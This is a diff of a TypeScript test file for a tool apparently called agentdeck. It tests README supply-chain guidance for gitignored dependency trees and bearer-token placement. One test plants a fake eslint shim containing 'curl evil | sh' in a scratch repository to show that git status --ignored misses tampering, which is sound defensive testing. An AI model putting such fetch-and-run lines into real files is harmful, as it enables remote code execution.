@@ -9,13 +9,16 @@
 // are unchanged.
 
 import assert from "node:assert/strict";
-import { chmodSync, mkdtempSync, rmSync } from "node:fs";
+import { execFileSync } from "node:child_process";
+import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { readFile } from "node:fs/promises";
-import { tmpdir } from "node:os";
+import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, test } from "node:test";
+import { fileURLToPath } from "node:url";
 
 const repoRoot = new URL("..", import.meta.url);
+const repoRootPath = fileURLToPath(repoRoot);
 
 const readDoc = async (name: string): Promise<string> =>
   await readFile(new URL(name, repoRoot), "utf8");
@@ -106,10 +109,13 @@ void describe("the host-execution consequence is documented where the claim is m
   });
 });
 
-// `git status` cannot see either of these trees, so the ordinary review is blind to them. The
-// container-local volume that used to cover that is gone with the container, which leaves one
-// command - `git status --ignored` over both paths - and the README has to carry it, because
-// nothing else will.
+// `git status` cannot see either of these trees, so the ordinary review is blind to them - and
+// the command that was supposed to cover that could not either. `git status --ignored` collapses
+// an ignored directory to one line naming the DIRECTORY: a rewritten `node_modules/.bin/eslint`
+// gives byte-identical output, and this file asserted the string was in the README, which turned
+// an ineffective control into a green check. So the assertion is now the inverse - the README
+// must NOT prescribe it - plus the replacement, which is the only shape that works here: replace
+// the tree from the reviewed lockfile rather than inspect it.
 void describe("the host-executed trees git cannot see are covered by a command that can", () => {
   for (const path of ["node_modules", ".pnpm-store"]) {
     void test(`${path} is gitignored, which is why the ordinary review misses it`, async () => {
@@ -118,12 +124,43 @@ void describe("the host-executed trees git cannot see are covered by a command t
     });
   }
 
-  void test("the README's checklist names the command that can see them", async () => {
+  void test("the README's checklist replaces the trees rather than inspecting them", async () => {
     const readme = await readDoc("README.md");
     assert.ok(
-      readme.includes("git status --ignored -- node_modules .pnpm-store"),
-      "README does not name a command that can see the two gitignored executed trees",
+      readme.includes("rm -rf node_modules .pnpm-store && pnpm install --frozen-lockfile"),
+      "README does not name a control that reaches inside the two gitignored executed trees",
     );
+  });
+
+  void test("and does not prescribe the check that reports the directory and not its contents", async () => {
+    // Demonstrated, not asserted from memory: `git status --ignored` over an ignored directory
+    // emits one line for the directory, so a file rewritten inside it changes nothing about the
+    // output. This runs it against a scratch repository and shows exactly that.
+    const dir = mkdtempSync(join(tmpdir(), "agentdeck-ignored-"));
+    try {
+      const git = (...args: string[]): string =>
+        execFileSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
+          cwd: dir,
+          encoding: "utf8",
+        });
+      git("init", "-q");
+      writeFileSync(join(dir, ".gitignore"), "node_modules\n");
+      mkdirSync(join(dir, "node_modules", ".bin"), { recursive: true });
+      writeFileSync(join(dir, "node_modules", ".bin", "eslint"), "#!/bin/sh\nexec eslint\n");
+      const before = git("status", "--ignored", "--porcelain", "--", "node_modules");
+      writeFileSync(join(dir, "node_modules", ".bin", "eslint"), "#!/bin/sh\ncurl evil | sh\n");
+      const after = git("status", "--ignored", "--porcelain", "--", "node_modules");
+      assert.equal(after, before, "git status --ignored turned out to see inside after all");
+      assert.match(before, /node_modules\/\n?$/);
+
+      const readme = await readDoc("README.md");
+      assert.ok(
+        !readme.includes("git status --ignored -- node_modules"),
+        "the README prescribes a command that cannot see what it is prescribed for",
+      );
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
   });
 
   void test("both trees are named as agent-writable where the claim is made", async () => {
@@ -223,7 +260,7 @@ void describe("the user's bearer token is not at the root of a working tree", ()
     // The .gitignore comment is the only tracked file that tells a reader where the token goes,
     // and loadToken's docstring is the only one a reader of the code meets. Both used to say the
     // path was outside every bind mount, in a container that no longer exists - a protection a
-    // reader would credit, and so never make the choice plan 005 says is open.
+    // reader would credit, and so never look at the placement again.
     for (const [path, text] of [
       [".gitignore", await readDoc(".gitignore")],
       ["src/server.ts", (await readDoc("src/server.ts")).slice(0, 3000)],
@@ -233,14 +270,38 @@ void describe("the user's bearer token is not at the root of a working tree", ()
     }
     const ignored = await readDoc(".gitignore");
     assert.match(ignored, /AGENTDECK_TOKEN_FILE/);
-    assert.match(ignored, /undecided|open in plan 005/i, ".gitignore must say the home is open");
-    assert.match(ignored, /root of a tree a session is\s*#?\s*pointed at/);
+    assert.match(ignored, /~\/\.agentdeck\/token/, ".gitignore must name where the token now is");
+    assert.match(ignored, /inside a tree a session is\s*#?\s*pointed at/);
+  });
+
+  void test("the default token home is one a clean Mac already has, and no session is pointed at", async () => {
+    // The old default was /var/lib/agentdeck/token, reasoned from a container-local volume: no
+    // ordinary user on a Mac can create it, so `pnpm start` failed on the token before it reached
+    // the port. Confirmed by hand at the time. The replacement has to be writable by this user
+    // with nothing set, and outside every tree a session can be started in.
+    const { defaultTokenFile, tokenInsideAllowlist } = await import("./server.ts");
+    assert.equal(defaultTokenFile(), join(homedir(), ".agentdeck", "token"));
+    assert.equal(tokenInsideAllowlist(defaultTokenFile(), [repoRootPath]), undefined);
+  });
+
+  void test("a token inside an allowlisted tree is caught, at the root and below it", async () => {
+    // The rule plan 005 states in prose in three places, as a check. Containment, not membership:
+    // a token one directory down inside an allowed repository is met by exactly the same
+    // `grep -rn token .` as one at its root.
+    const { tokenInsideAllowlist } = await import("./server.ts");
+    const allowed = ["/workspace/web", "/workspace/agentdeck"];
+    assert.equal(tokenInsideAllowlist("/workspace/web/token", allowed), "/workspace/web");
+    assert.equal(tokenInsideAllowlist("/workspace/web/a/b/token", allowed), "/workspace/web");
+    assert.equal(tokenInsideAllowlist("/workspace/web", allowed), "/workspace/web");
+    // The neighbour whose name merely starts the same is not inside it, which is the mistake a
+    // string prefix without the separator makes.
+    assert.equal(tokenInsideAllowlist("/workspace/web-secrets/token", allowed), undefined);
+    assert.equal(tokenInsideAllowlist("/var/lib/agentdeck/token", allowed), undefined);
   });
 
   void test("an unwritable token path is a sentence naming AGENTDECK_TOKEN_FILE", async () => {
-    // The default path is /var/lib/agentdeck/token, which no ordinary user on a Mac can create,
-    // so this is the first thing `pnpm start` hits. An unhandled EACCES names no variable and the
-    // token then lands wherever happened to be writable - including the one place it must not be.
+    // An unhandled EACCES names no variable and the token then lands wherever happened to be
+    // writable - including the one place it must not be.
     const { loadToken } = await import("./server.ts");
     const dir = mkdtempSync(join(tmpdir(), "agentdeck-token-"));
     try {
